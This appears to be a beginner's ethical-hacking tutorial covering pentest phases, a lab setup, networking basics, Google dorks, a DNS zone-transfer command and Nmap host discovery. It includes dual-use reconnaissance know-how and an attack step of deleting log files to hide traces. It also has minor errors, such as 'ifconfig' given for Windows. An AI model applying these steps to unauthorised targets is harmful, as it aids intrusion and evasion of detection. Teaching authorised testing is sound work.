**Introduction to Ethical hacking**

The various recent attacks on several company’s IT infrastructures has raised the awareness and the fear for such issues.

All these causes led to the formation of a new professional figure with substantial experience in cybersecurity responsible for testing, verifying, and strengthening the security of a specific entity.

Contrary to common belief, you do not need special skills, decades of study, or many years of work experience to become an ethical hacker: with an essential preparation, you can already grasp the main concepts of how to organise your work as an ethical hacker.

**Penetration testing method**

With penetration testing we are referring to all the procedures necessary to execute a security testing within an entity.

**An ethical hacker acts ethically against those who used the same tools and techniques to behave maliciously.** This is the most important difference between ethical and unethical hackers. The former only works when commissioned by a client, who will be the only one informed of all the results achieved and the problems spotted by the ethical hacker.

A **security engineer** focuses more on the protection of network infrastructure and specialises in **permitter security systems** (firewalls, IDS, IPS, etc).

The ethical hacker has a vertical specialisation in executing penetration tests within a specific context.

In some circumstances, both roles can come in contact and exchange skills.

An ethical hacker never acts on his own, but instead, according to the agreement reached with the client who commissioned his work.

Besides, it is imperative to define the scope of the penetration test, in other words, what are the parts of an IT infrastructure we are allowed to work on and what are the limits we should never cross.

**Necessary knowledge for an ethical hacker**

First of all, you should be familiar with computer networks. You cannot expect to be able to protect or attack a network if you do not understand how it works, at least on a fundamental level.

Secondly, you will need to study at least one programming language. Start with Python.

These two aspects are indispensable.

**Possible attack sources of a network**

In how many ways is it possible to attack a system? Many. For now, here are some of them, while others will be elaborated in the next chapters.

-   _**Endpoints:**_ the PCs of users within a local network. They are often unprotected and seldom correctly updated.
-   _**Smartphones and tablets:**_ if connected to the wi-fi of a company’s network, these devices represent a possible source of attack that should not be underestimated.
-   _**Outdated softwares:**_ it is almost impossible to find updated software on the latest release or patch for each network system or device. The presence of obsolete software in our network often creates serious vulnerability.
-   _**Wrong configuration of network devices:**_ if not correctly configured, routers, switches, and firewalls expose parts of our network to the outside world. The consequences are easy to imagine.
-   _**Internal threats:**_ think of what can imagine if we connect a USB flash drive with a virus to a PC connected to the internet.

**Phases of a network attack**

_**A cyber attack almost always follows a precise process and does not originate from a single action: it is the result of a step-by-step process, the more time we spend on each one of these phases, the more efficient the final work will be,**_

First of all, you should collect all the information available on the subject you want to attack.

Then you can perform a detailed scanning for possible vulnerabilities.

Once you find a valid one, you can attempt to access that network. That is where the word “penetration” in penetration test comes from.

This is not enough to penetrate it. It is also essential to always keep access valid to access the network whenever we want. In technical jargon, we can say that our session should be persistent.

Finally, but not less important, we should remember to cancel the traces we have left. For example, you can remove the log files that have traced our activity. In this regard, in the next chapters, we will talk more about IPS/IDS.

Here is a short summary of the concepts I have just mentioned:

1.  Information collection;
2.  Network scanning;
3.  Access to the network;
4.  Maintaining access to the system;
5.  Cancelling the log files.

We are getting closer to define what penetration testing is.

**The ethical hacker will send a final report to the client**

The final report contains each step and action that was taken as well as the useful suggestions to solve the vulnerabilities spotted.

**Phases of a penetration testing**

Here is the list, we will then dig deeper into each of these steps:

1.  Information gathering
2.  Network scanning
3.  Enumeration
4.  Vulnerability assessment
5.  Exploitation
6.  Post exploitation
7.  Final Report

_**Information gathering**_

It is necessary for us to examine multiple aspects of our target, possibly in advance. We need to understand what business it is, what it sells, what people work there, and what are the tools used. In other words, all the information we can gather will become useful for us at a later time.

Do not ignore or underestimate each of them.

Another step within the information gathering phase is the analysis of the network infrastructure by using information in the public domain.

You should avoid interacting directly with your target at this stage. We can instead rely on tools and platforms available on the Internet:

-   Google (or other search engine);
-   Whois search;
-   DNS;
-   Social media;
-   Metadata;
-   Websites with job listings;
-   Tools like Maltego and Recon-ng;
-   Specific browsers, like Shodan.

**Networking scanning**

The information gathered during the previous phase can help us to go deep with our target and start with our network scanning. Pay attention to the fact that in this stage, we begin to interact directly with our target, and there is the risk of being identified, especially if we do not take all the related precautions.

Scanning a network is almost like finding yourself in a wide street in a big city, a place full of shops. All of a sudden, you start to pick the locks of each one of them hoping that at least one is open and unprotected.

At this stage, we will not log into the network, and we will just acknowledge the fact that the door is open. It is not sure that all our activities while scanning the network will not be noticed.

**Enumeration**

_**Enumerating the network means discovering and listing all the resources available.**_ Imagine that during the previous phase, we found a door possibly open. Now we need to find out what information can be enumerated concerning the service linked to that door.

This phase is often underestimated, even if it can provide useful information.

**Vulnerability assessment**

Now that we have discovered what doors and services are accessible, we should identify all the possible vulnerabilities of our target. We can rely on automatic tools that make our work easier.

However, we can incur in a myriad of false positives or false negatives. Otherwise, we can perform a manual analysis if we have more experience in this matter.

The best method is the combination of both. By alternating tools and manual analysis, you will see the best results.

**Exploitation**

Spotting the vulnerabilities is not enough. What we need to do next is trying to _**exploit**_ them so to gain access to the system.

We will search for the gateway for each vulnerability that allows us to access the system. This will not always be possible, but we should keep each path into consideration.

Performing a penetration testing is not only about access to a network, but it is also a much broader task. We should identify all access points that are not secure and inform the client to help to find a rapid solution.

**Post exploitation**

What happens if, for any reason, we lose the access point we worked so hard to find? Will we be able to access the system once again?

In this phase, this is precisely what we worry about. Our goal is to create an access point that is always available. By doing this, we will be able to access our target even at a later time.

**Final report**

At this point, if everything went well, our work should be considered completed. We should provide the client with a _**final report containing the summary of all our actions**_ and our suggestions on how to make that network more secure.

**The Laboratory**

Our first task is to build our own laboratory.

How can we build a protected environment where we can perform our simulations? The answer is straightforward: we can use a _**hypervisor**_.

This consists in simultaneously _**executing multiple virtual machines**_ and, therefore, more operating systems within the same physical system. A hypervisor makes the whole process much more convenient!

**Virtualisation**

With virtualisation, you will be able to run several operating systems at the same time inside your PC. The only limit you have is the RAM memory you can use.

The procedure is not difficult, even though you will need to become more familiar with this tool. Basically, here is the list of steps you should take:

-   Download a particular software called hypervisor.
-   Collect the .iso images of the operating systems you want to install.
-   Access the software.
-   Start the virtual machine creation process.
-   Create and boot this virtual machine.
-   Proceed with the installation of the desired operating system.
-   Use the virtual machine you have just created.

**Hypervisor**

The hypervisor is a software that allows you to run virtual machines inside your physical PC.

You can choose among several versions. Some of them are free, while others require a subscription fee. Here are the most common ones:

-   VMware Workstation (paid version)
-   VMware Player (free version)
-   Oracle Virtualbox (free version)

The VMware Workstation is the most complete one in terms of the variety of functions and options available for network management.

_**Images of an operating system**_

In order to create your virtual machines, you need an image of the operating system you want to install. For the lab we are building, you need the image (.iso format) of the following operating systems:

-   Kali Linux (freely downloadable)
-   Windows 7
-   Windows 10

Kali Linux will be our attacking machine, basically the one which we will use to start all our attacks. The other two Windows machines will instead be our targets.

**Creation of virtual machines**

Now we just need to create virtual machines. Pay attention to the quantity of RAM you will be using. This amount depends on the RAM available on your PC, and you should try not to overuse it.

**Network management**

Managing the network correctly is extremely important. If you do not configure it correctly, the virtual machines will not be able to communicate between each other and hence your laboratory will not work properly.

In VMware we can use 4 different types of networks:

-   Bridged - this type includes the creation of an IP address belonging to the network in which your physical PC is located.
-   NAT - once in this mode, your virtual machine can connect to the internet, but it cannot be reached from the outside.
-   Host-only - in this case, the virtual machine can only communicate with your physical host.
-   Custom - here you can define your personal network and let all the virtual machines communicate inside it.

To create a Custom type of network, go to “Edit > Virtual Network Editor” and create a new network as in the screenshot below:
![[Screenshot 2022-03-10 at 09.29.23.png]]
Now you should go back to the settings of your virtual machine. You can choose the network adapter just created above.

After this step, each virtual machine will have its own IP address, which is automatically assigned.

**Virtual machines booting**

Now you are ready to boot your virtual machines. If you have correctly performed all the operations described above, the machines will all be started up and will have the IP address previously assigned.

Keep in mind that these virtual machines will now only be able to talk to each other and cannot be connected to the Internet. If needed, we will have to change the network adapter and set the NAT mode.

**Installation of the VMware tools**

VMware tools are nothing more than a set of features to improve the overall performance of your virtual machine.

You just need to google the keywords “installation of VMware tools on Kali linux”.

**Connectivity verification of virtual machines**

Our last effort now will be to verify that our virtual machines can talk to each other. The steps you will need to take are the following:

1.  Verify the validity of the IP address assigned to each virtual machine.
2.  Run the “Ping” command on each virtual machine and verify that the response is positive.

How to do it:

-   Access the KALI machine and run the “ifconfig” command from the terminal, verifying that the assigned IP address is available.
-   Access the Windows 7/10 machine and on the command line type “ifconfig” to verify the presence of the assigned IP address.
-   Take note of these IP addresses.
-   On the KALI machine, enter the command “ping IP address Windows 7/10” to verify that the response is positive and that we are not experiencing packet loss in the response.
-   On the Windows 7/10 machine, type the command “ping IP address Kali” verifying that the response is positive and that no packets were lost in the response.

If all the responses are positive, we can start working on the next step. The setup phase of our penetration testing lab is over.

**Linux commands**

**Basic commands**

These are the most common commands that you will probably use for your routine tasks.

_**$ ls**_ (this command allows you to list the contents of files and/or folders)

_**$ pwd**_ (the current directory is printed)

_**$ cd**_ (allows you to access the selected folder)

_**$ cp**_ (allows you to copy files)

_**$ mkdir**_ (allows you to create a folder)

_**$ rmdir**_ (allows you to remove a folder)

_**$ touch**_ (allows you to create a file)

_**$ tar**_ (creates an archive for a certain file)

_**$ clear**_ (allows you to return to an initial shell)

_**$ adduse**_r (allows you to add a new user)

_**$ chmod**_ (manages file and/or folder permissions)

_**$ vi**_ (allows you to edit a file)

_**$ cat**_ (allows manipulation of a file)

_**$ grep**_ (searches a file for particular patterns)

_**$ apt-get**_ (package management. For example, apt-get install)

**Network commands**

Working as an ethical hacker requires you have a strong knowledge of the most common networks commands. Here are some of the commands related to networking:

_**$ ifconfig**_ (utility to configure network interfaces. It will be  very useful to view the IP address assigned to a machine)

_**$ traceroute**_ (this command allows you to trace the path of an IP packet to the host network. It is very useful for performing troubleshooting activities such as, for example, verifying where in the path a certain IP packet stops or is lost)

_**$ dig**_ (this is a utility needed to query DNS. There would be plenty of other things to say about this command and its functioning is quite complex)

_**$ telnet**_ (this command allows us to make connections to remote hosts via the TELNET protocol. This protocol allows a clear visualisation of data without any encryption mechanisms. For this reason, it is not a very secure protocol)

_**$ nslookup**_ (this is another utility to interrogate DNS and to perform inverse resolution queries.

_**$ netstat**_ (this is a command of the utmost importance. It allows you to view the network connections opened at a certain time. Useful in troubleshooting, it allows us to verify anomalies due to network connections that were not established or lost. Take some time to improve your knowledge of this tool).

_**$ ifup, ifdown**_ (this command allows you to enable or disable network cards. It can be very useful in certain situations, perhaps when a reboot of network services is required).

_**$ ping**_ (the Ping command is used to check whether a certain host is active or not by sending special ICMP type packets to it and waiting for a response).

**$ route** (this command is used to display the routing table of a certain host, namely the paths that the network packets must perform on the network or on particular subnets).

_**$ arp -a**_ (this command provides us with a table of the links between a MAC address and an IP address. For example, it can be used when we want to exclude problems concerning the lower levels of the ISO/OSI model (data level).

**Commands related to system management**

These commands are related to the ordinary management of your Linux machine.

$ uptime (this command shows you for how long a certain system has been active)

$ users (this command shows the user names of users connected to a system)

$ who / whoami (this is another command that informs us of how many users are connected to the system as well as some additional information)

$ crontab -l (this command allows the display of scheduled jobs related to the current user)

$ less / more (this command is very useful because it allows you to quickly view a file. Press the "q" key to exit this particular display)

$ ssh (this command allows the connection to a remote host via an ssh protocol. The latter, unlike the Telnet one, carries out data encryption. For this reason, in the event of traffic interception, it will not be possible to clearly see any data)

$ ftp (this command allows the connection to an FTP server via the FTP protocol. This protocol does not perform data encryption, so you need to pay attention when using it)

$ service start / stop (this command allows you to start or stop a certain service. You will use it on many occasions)

$ free -h (this command shows the amount of free and used memory. For example, it can be used when there are performance problems on a machine)

$ top (this command allows you to check the active processes in a system. It can be useful if a machine is running very slowly for no apparent reason)

$ ps (with this command you can view the active and running processes in a system)

$ kill (this command is used to terminate a certain process. However, it is necessary to first identify the PID related to that specific process.

**Mind Maps**

What are mind maps? We can say that a mind map is a tool that allows us to organize information according to a certain logic and with precise method.

During your work as a penetration tester, you will collect a great deal of information that needs to be organized efficiently.

Since the information gathered change and increase over time, the draft of a mind map is a dynamic process that evolves as time goes by.

### **Network theory**

We cannot talk about ethical hacking and computer security without grasping the basic network concepts.

A network is actually much more complex that it will be introduced here. You will have to dig deeper into these topics.

Each time we mention any network functionality, we are referring to a model called ISO-OSI.

_**ISO-OSI model**_

The first thing you will need to remember is that the ISO-OSI model is a theoretical formulation that allows you to identify exactly in which network layer we are operating.

These layers are:

-   Application layer
-   Presentation layer
-   Session layer
-   Transport layer
-   Network layer
-   Data link layer
-   Physical layer

We will focus on the following ones: physical layer, data link layer, network layer, and application layer.

-   Physical layer: this layer includes everything related to the transfer of data within a specific means of communication (copper, fiber or radio wave network cable).
-   Data link layer: this level finds its maximum expression within the context of local networks (LAN). In a LAN, it is necessary to refer to the MAC address and the IP address of a certain network device as well as to their subsequent association, also known as the ARP table.
-   Network layer: this level focuses on the communication between different networks. In this case, we will mainly use the Internet Protocol (IP).
-   Application layer: high-level protocols interact with each other at this layer. Some of these protocols include but are not limited to HTTP, HTTPS, FTP, and others.

We can find other names for each one of these layers depending on the type of device involved:

-   Physical layer: means of physical and non-physical communication.
-   Data link layer: switch
-   Network layer: router

**MAC Address**

The MAC (Media Access Control) address is a 48-bit address that is uniquely assigned by the manufacturer of each Ethernet or wireless network card.

This address is fundamental in the world of networks because it allows a machine to be uniquely identified within a local context (within a LAN, for example). To surf the internet, for example, you will never use a MAC address, you will rather rely on an IP address.

When one or more devices are part of a local or LAN network, all PCs belong to the same subnet. Therefore, each time we need to communicate with another network, we are implicitly referring to the IP address and not to the MAC address.

**IP Address**

The IP address appears as a numeric value of 32 bits and allows the identification of both the network and the host. Basically, we can say that a part of the IP address is intended to identify the network while another one locates the host.

Each time we need to surf the internet, or communicate with another subnet, we must necessarily use a previously assigned IP address. No machine can browse if it is not provided with an IP address.

IP addresses are divided into public and private. The public ones allow browsing on the Internet, while the private ones are used inside internal sub-networks (a company's network, for example); no private IP address will ever be able to surf the internet.

Private IP addresses are divided into 3 different classes:

-   Class A private IP addresses where the initial IP address is 10.0.0.0 and the final IP address is 10.255.255.255.
-   Class B private IP addresses where the initial IP address is 172.16.0.0 and the final IP address is 172.31.255.255.
-   Class C private IP addresses where the initial IP address is 192.168.0.0 and the final IP address is 192.168.255.255.

The choice of a specific class depends on the size of our subnet and on how many IP addresses we must assign to the machines.

**ARP protocol**

It is very simple to operate but exposes us to multiple security threats. Being a protocol without any type of authentication, it can be vulnerable to different types of attacks, including the so-called "Man in the middle".

**ARP stands for "Address Resolution Protocol".** This protocol keeps track of the association between a MAC address and an IP address. Remember that in a local context we need our devices to be identified by a MAC address.

Then, once outside of it, we will communicate exclusively via an IP address. This protocol is defined by means of a table. You can type the "arp -a" command to view the ARP table of your system.

**The default gateway**

When you need to communicate within your local network, you will use the ARP protocol, which facilitates the association between a MAC address and an IP address.

However, you will also have to communicate externally, for example on the Internet. At this point, you will need to know exactly what other network devices you are trying to reach, like for example a router.

This is where the default getaway comes into play. It is the "best device" to use when you need to communicate outside your local network. Every time your PC does not know where to send a certain IP packet, it will send it to your default gateway for further processing and to allocate it to subsequent devices, which are part of the IP packet path.

**NAT (Network Address Translation)**

When you surf the internet form home, several things will happen: the first one is that your PC will receive a private IP address, usually belonging to class C (192.168.1.0/24).

However, as you already know, this is not enough to browse on the internet. You need a public IP address, and this is where your router and NAT come into play.

The router will automatically translate the private IP address into a public address and therefore you will be able to navigate without any problems. The peculiarity of this mechanism is that, if you have ten devices at home, each with its own private IP address, they would all be associated with the same public IP address.

In corporate networks, companies try to reduce the number of public IPs assigned. For this reason, few of these IPs tend to correspond to many private IP addresses for each of the PCs in the network. There are several reasons why this happens:

1.  The number of IPs is limited and only few of them are still available.
2.  Using this NAT mechanism allows you to create a first layer of network protection. This means that nobody from outside knows your private IP address. Instead, potential attackers might only be seeing your public IP address without knowing the table of private IP-public IP associations. This is not enough for them to trace us.

In corporate networks, the firewall usually performs the NAT.

Besides, there are several types of NATs.

**DNS (Domain Name Server)**

The DNS is another essential service of a network. As a penetration tester, you will hear it mentioned often because if it is not correctly configured, it can offer many interesting spots for an attacker.

This mechanism was created to translate a numeric IP address into a line of text (URL), which is easier to understand and remember. Rather than typing 34.25.7.34 on your browser, you simply write [www.google.com](http://www.google.com).

We can divide the DNS into two main categories: the public and the private ones. The public ones are meant to resolve the public IP addresses, while the private ones will translate the private IPs.

DNS have a hierarchical structure. Basically, when a DNS does not know a response, it will ask its neighbors.

If a certain DNS server is not adequately protected, it can transfer all its contents to an attacker. It can even share thousands of IP-name associations.

From here comes the name of a well-known cyber attack: the DNS zone transfer.

**DHCP (Dynamic Host Configuration Protocol)**

Namely the dynamic IP configuration protocol.

This protocol automatically assigns all the parameters through a central server that manages the whole network.

A DHCP can generate two types of network packets:

-   DHCPDiscover - the PC that needs an IP address sends this packet to the entire network hoping that a DHCP server will be able to intercept it.
-   DHCPOffer - when a DHCP server receives a DHCPDiscover packet, it tries to satisfy the request and sends a DHCPOffer packet with all the necessary network parameters to the MAC address of the PC (the IP is obviously still unknown).

**Port and Service**

For a penetration tester, it is necessary to have a clear understanding of the notions of door and service.

We can say that both concepts of door and service are closely connected to each other. In order to perform its tasks, any PC needs to establish different types of connections with the outside world. It must rely on a dedicated communication channel to offer or require any service. We can imagine a door as the end of this channel.

There are 65535 ports available, but not all of them are used.

All the ports up to the 1024th one are usually dedicated to the most common services.

In summary, each service needs a specific port to communicate with and from the outside world. This mechanism will have a strong impact on our actions as a penetration tester. Open ports available on a certain PC can provide excellent information and a possible access to this system.

**ARP-Ping-Traceroute**

ARP and Ping are two important commands which will help you in your career as a network expert. They will allow you to solve most network problems.

The first major distinction between them lays in the layer of the ISO-OSI model in which they operate:

-   ARP - between data link level (MAC address) and network layer (IP address).
-   Ping - network layer (IP address).

We can run into all sorts of network problems and we can make our lives easier only by identifying where we are exactly on the TCP/IP stack.

### **Corporate Networks**

Corporate networks can become more complex than private ones. You will need plenty of knowledge and experience to fully understand all their nuances.

No network can work without being supported by at least two devices: a SWITCH and a ROUTER.

The Firewall, although not essential, is always present in a corporate network.

**Cisco packet tracer**

This kind of software allows to create and simulate network scenarios. We can use it to perform tests and better understand the functioning of a certain device or the global behaviour of a network.

The Cisco Packet Tracer is free, and you can download it at this link: [http://www.netacad.com/courses/packet-tracer-download/](http://www.netacad.com/courses/packet-tracer-download/).

Read the complete and well-written documentation of this software to immediately create your first network diagrams. Furthermore, it is better to use the "Simulation" mode to perform network simulations. You will better understand how network devices interact with each other.

**LAN-WAN-DMZ**

In order to interact with a medium-large network, we first need to define its topology. We need to divide our network into several areas so that we always know where we are. This also helps us to segment, organize and manage the traffic passing through our network.

Everything happening inside our private network, where our private IP addresses are assigned, is called LAN (Local Area Network).

When we need to connect to the Internet, we will refer to the WAN (Wide Area Network).

We will almost never use only LAN and WAN. There are also other parts of the network that we will introduce with a different logic. One of these is the so-called "DMZ", which means "demilitarized zone". In this area, we will be forced to expose even critical services to the outside world. Precisely because of the implicit risks, we should not include these services into our LAN, which is a part of the network that should always be protected as much as possible.

We can summarize this concept by saying that each network will always consist of a LAN part and a WAN part. However, if necessary, we can add and define other portions of the network, like for example the DMZ.

**The Switch**

The main function of the Switch is to sort packets within a network. It operates at the data link layer of the ISO/OSI model.

When we talk about a Switch, we are referring to the MAC addresses, never to the network layer and to IP addresses.

The switch is based on MAC addresses and works inside a specific subnet. Within a subnet we can find one or more switches.

A switch can never be connected to two or more subnets. Each time more PCs need to communicate within the same subnet, we will have to insert and then configure a switch. This device is made up of several ports, which work as multiple network interfaces.

The packets sorted by the Switch are called FRAME.

A switch can read the MAC address contained in the Ethernet frame and knows exactly to what machine the message should be sent. For this reason, it does not need to forward it to all the connected devices.

Let's see the detailed process behind how this device works:

-   The switch automatically learns the topology of the LAN network. It can figure out to which of its ports each PC is connected.
-   It summarizes in a table, called the CAM table, the associations between each port and MAC address. This table is then automatically updated every time new packets arrive.

The Switch has other more advanced features, such as MAC address filtering or other particular control operations.

**The Router**

The Router's function is to transport the packets outside the subnet in which we find ourselves.

Remember, we are dealing with IP addresses, not MAC addresses. A router operates at the network layer of the ISO/OSI model.

Let's suppose that we are in a company with two distinct departments: the administrative and the technical one. Most likely these two will belong to different networks. Let's assume that we can count on two networks with the following settings:

-   Administration: network 192.168.1.0/24
-   Technicians: network 192.168.2.0/24

All administration PCs will certainly have a switch that connects them and therefore will be able to talk to each other, and the same happens for the technical department.

But what if an administration PC wants to send a file to a technician's PC? It cannot do this, because they belong to different networks and the switch cannot establish a connection between different networks. It is in this case that the router comes into play.

This device will have its own interface connected to the 192.168.1.0/24 network and another one connected to 192.168.2.0/24. In this way, the two networks can communicate with each other.

Conclusion:

-   Switch: is intended to manage the traffic within a specific network segment;
-   Router: is used for connecting multiple networks.

**The internet itself is just a group of distinct networks.**

**The Firewall**

Is nothing but a router with advanced security features. By convention, we place the firewall between the upper end of the data lyer and the lower end of the network layer. For this one, we still have to manage MAC and IP addresses.

The main function of this device is to carry out packet filtering. It manages the traffic entering and leaving the network, and it is based on the concept of port and/or service. It also helps us to create security rules, which we will then include in our "security policy". We also need to decide what service, door, or application should be open or closed in our network.

In recent years, new security features have been added to the firewall, so much so that today we talk about a "Next Generation Firewall".

Some of these features include URL filtering, application control, as well as the creation of VPNs, IPS, and IDS networks.

-   Enterprise Level Firewalls: Checkpoint; Paloalto; Fortinet.
-   Private firewalls: pfSense

## Information Gathering

There are mainly three types of penetration tests:

-   Black box testing - the person who performs the security test is not aware of any details on the network infrastructure that he will have to test. This penetration tester will often only be informed of the client's company website.
-   White box testing - the operator is aware of all the information of the network to be examined or of the area to be tested.
-   Grey box testing - is a middle ground compared to the other two categories.

Let's suppose we need to perform a "black box" test. We have no knowledge of our target and that is why we need to gather more information. It is in similar scenarios that the information gathering phase is placed. We will analyze in detail the tools and procedures that can help us to successfully complete this phase.

You should take your time when carrying out these activities. This phase should be completed accurately and without haste.

**First considerations**

There is not a single method. Gathering information means investigating, analyzing, and studying everything related to our target.

Imagine having to perform penetration test against a transport company. Start by collecting information on their employees, suppliers, business relationships established over time, company data, etc.

All your activities will be a consequence of the type of target you will be dealing with. However, we can find some common steps to which we can refer. We can schematize them as follows, depending on the type of search we want to perform:

-   _**Using Google Hacking - Google Dorks.**_
-   _**Use of Google cache.**_
-   _**The "Wayback machine".**_
-   _**Information from social media.**_
-   _**Keywords in job listings.**_
-   _**Metadata extraction.**_
-   _**WHOIS use.**_
-   _**Querying a DNS.**_
-   _**Information colleciton with Maltego.**_
-   _**Information collection with Recon-ng.**_
-   _**Vulnerability assessment with Shodan.**_

This list is not complete, also considering that the steps we should take depend on our target. However, this list is a good starting point.

**Google Hacking - Google Dorks**

Google can be used for particular queries that are much more specific and in-depth than the ones we normally perform.

We can make such queries using search operators and special strings.

-   allintitle: gandalf silmarillion - this query will only return the pages that have the words "Gandalf" and "Silmarillion" in the title of a document.
-   inurl: home - this query only shows the pages that contain the word "home" in their URL.
-   cache: [website]- when we want to recover the cached version of a web page, we will type the keyword "cache".
-   filetype: doc home - this query allows us to search for certain document formats, such as .doc or .pdf, related to a keyword specified by us. In this example, we are searching the word "home".

The **"Directory Listings"** is a very useful technique that consists in a list of folders and files within a certain website.

A wrong configuration of this function often leads to other users having access to sensitive material that should not be disclosed.

Let's see how to implement this query:

Query on Google:

-   intitle: index.of
-   intitle: index.of "parent directory
-   intitle: index.of name size

It is useful to try all these combinations in order to avoid the risk of inaccurate or missing information.

Another way to search for interesting files or folders is to simultaneously use the "inurl" and "filetype" operators.

Here are some practical examples:

-   inurl: backup → list of possible backup folders.
-   inurl: admin → list of possible administrative folders.
-   inurl: admin intitle: login → possible list of login pages
-   inurl: admin filetype: xls → possible .xls format file named "admin"

It would be extremely difficult to memorize all the possible queries you can search on Google. You can check the **Google Hacking Database**, that lists hundreds of possible queries:
https://www.exploit-db.com/google-hacking-database

You should keep in mind that Google does not look favorably on the use of these queries. After a certain number of attempts, a control captcha may appear to check that you are not a robot.

**Google Cache**

The Google Chache is a useful tool that allows to view how a webpage looked like during google's last visit.

If there have been any subsequent changes, you will be able to view them and maybe discover details and sensitive data, which were incorrectly disclosed and then hidden.

There are two ways to view the cache:

-   Through Google keywords;
-   Through dedicated websites.

**Wayback machine**

During all its revisions, a website may have exhibited documents containing crucial details for our information gathering.

We will refer to a service callled "Wayback Machine" ([](https://archive.org/web/)[https://archive.org/web/](https://archive.org/web/)). We just have to type the URL and the date. This website will automatically take us back in time.

**Information from social media**

It may seem trivial, but it is not. The social media accounts of people and companies often reveal an impressive amount of information, which has been unwittingly made public. Make a careful search starting from the company's official accounts or from the accounts of its employees, especially the ones registered on LinkedIn, Facebook, Twitter.

**Keywords in job postings**

For every new job listing, the company is often disclosing more information than it might think. The job listing often provides a list of all the technologies used by the company.

**Metadata Extraction**

A metadata is nothing more than additional information inserted within the document and it can serve several purposes. Almost every type of file contains metadata, which is always present, even if in different quantities.

One of the most used software tool in this context is **ExifTool**. This tool extracts and displays the metadata starting from a file we inserted.

**Using WHOIS**

While collecting information, we should be able to identify an IP address or URL string belongs to what internet provider as well as the domain name holder. WHOIS is a network protocol aimed at performing this task.

WHOIS can be consulted from the command line, but also from web applications, that allows to enrich the search.

-   command line query: just type the "whois" command followed by the website name or IP address.

**Using DNS**

A DNS query is the simplest operation we can perform in this case. We should run the command "nslookup", which we can use to ask the DNS to show us the association between hostname and IP address.

Another command we can execute on Linux systems is DIG. This command allows us to gather different information and interrogating DIG is a very simple task:

_**dig [www.website.com](http://www.website.com)**_

Now, let's try to understand what DNS zone transfer is and how it works.

The "zone transfer" activity consists of listing each record on the DNS server to which the request is sent. In other words, with a specific command, we can ask the DNS to provide us with all its records. We will then collect a substantial amount of data that can be very useful.

Each of these records and IP address obtained will allow us to have a sort of map of the target network.

We will rely on DIG to attempt zone transfer and this is the command we should launch:

dig @IP_Address_DNS domain AXFR

example: dig @192.168.2.10 company.local AXFR

However, the zone transfer might not be enabled.

**Maltego and Recon-ng**

These are tools that can automate our information gathering. They are very useful to us but not that easy to use. Once you have become familiar with these tools, you will not be able to complete this task without them.

We have to define objects. Starting from these, we then can carry out the operations we need (name resolution, identification of the block of IP addresses, zone transfer, etc).

**Shodan**

Is a powerful search engine that allows us to find vulnerabilities and configuration errors on devices that are exposed on the internet. We can run queries of any kind and for this reason you should read the official documentation.

For example, we can search for all SCADA -type devices that have a web server exposed on port 80 (http).

## Network Scanning

The information gathering phase is over and it allowed us to collect, among other things, a list of IP addresses. Each of these IP addresses will expose a certain service/port to the outside world.

We need to scan them to identify the port corresponding to a certain active service. For example, a web server will most likely have port 80 or 443 listening, so as to accept requests based on the HTTP, HTTPS protocol.

There are several scanning techniques we can choose. Some of them are silent, others not that much.

**KFSENSOR**

To see the network scanning techniques in action, we need to expose services on a specific machine, or we can use a very useful tool that make these steps easier. It's called KFSensor and it's a "honeypot".

Honeypots are deliberately vulnerable machines, which are sometimes used to confuse a potential attacker. We usually use them to push our opponent towards this trap so that we can strudy and analyze their behavior.

KFSensor is a honeypot for Windows operating systems. "Advanced Windows honeypot system is a enhanced intrusion and insider threat detection for your network."

**Wireshark**

A network "sniffer" is a tool that allows you to collect and analyze all network traffic. The best among the sniffers is Wireshark ([https://www.wireshark.org/](https://www.wireshark.org/)).

While you launch the various network scans, you can still leave Wireshark running, so as to observe what happens at the level of network traffic.

**Arping and Level 2 network scan**

The network can be scanned both at the data link layer and at the network layer of the ISO/OSI model.

Scanning at the data link layer (level 2) makes sense only if carried out within a local are network (LAN). In local networks, we will mostly be dealing with MAC addresses and the ARP protocol.

**NMAP and Level 2 network scan**

Nmap is the most widespread as well as the most reliable and versatile network scanning tool. It allows us to perform multiple types of scans, form level 2 onwards. Nmap also contains a whole series of additional features, such as vulnerability scanners and modules for enumerating a system.

Phases with which Nmap does its work:

1.  Name resolution.
2.  NSE script pre-scan phase.
3.  Host discovery.
4.  Parallel reverse name resolution.
5.  Port or Protocol scan.
6.  Service version detection.
7.  OS fingerprinting.
8.  Traceroute.
9.  NSE portrule and hostrule script scanning phase.

For now, let's focus on the host discovery phase. We will have to instruct Nmap not to perform any types of port scan, and to merely check which hosts are active on the network.

This is a level 2 scan based on the ARP protocol and the MAC address.

"-sn" is the option you should use to instruct Nmap. That is why we should launch this command:

_**$# namp 192.168.1.100-150 -sn**_

192.168.1.100-150 is the range of IP addresses we want to test. We could be dealing with a single address or a subnet.

This type of level 2 scan only makes sense in local contexts where you communicate with MAC addresses.

Outside the LAN, we only use IP addresses, and therefore the network scan is set at a higher level.

**Useful findings for Level 3 network scans**

-   it would be better to use the IP address and not the hostname so as not to have to perform a DNS query and possibly alter the results obtained. We obviously need to set some limits.
-   When dealing with a web server that hosts multiple websites, it makes sense to use the hostname and DNS resolution.
-   With large networks, it might take longer to complete a scan. For this reason, it is advisable to use a small network sample or dwell only on a small range of doors.

**Ping scan with Nmap**

In the simplest type of Level 3 scan, we will use a particular protocol called ICMP (Internet Control Message Protocol), which implies that we are not using either the TCP or UDP protocol.

The ICMP performs various control functions, including the verification of reachability of a certain host within a network.

To do this, we use the PING command specifying with the "-c" option the number of ICMP packets we want to send to the target machine or network.

_**$# ping 192.168.1.129 -c**_

Don't forget to check the network traffic with Wireshark. You should also use the "icmp" filter.

Wireshark will show us that we are using the ICMP protocol and that packet exchange is happening as follows:

-   **Echo request.** The attacking host sent the ICMP packet to the target machine.
-   **Echo reply**. The target machine sent the response packet to the attacking machine.

**TCP and UDP protocol**

The Level Transport Layer is mainly composed of 2 protocols: TCP and UDP.

The main difference between these two protocols is that TCP is a connection-oriented protocol, while UDP has no connection. Basically, when we need to use TCP, we have to do it by creating a connection between the two ports.

They both should want and be able to communicate with each other, otherwise there will be no exchange of information.

We can easily deduce that TCP is a reliable protocol that, besides rare and manageable exceptions, offers us the receipt of the information sent.

On the contrary, with UDP we have no certainty. On the other hand, UDP is a very fast protocol, while TCP is less efficient due to all the additional checks it has to perform.

**TCP control flags**

The TCP protocol performs a connection check. To do this, it uses a series of additional information within the network packet, and we are interested in the so-called "TCP flags". there are six of them:

-   SYN
-   ACK
-   RST
-   FIN
-   PSH
-   URG

SYN and ACK are the most important TPC flags, because they take part in the "Three-way handshake". This procedure allows the TCP protocol to establish a communication.

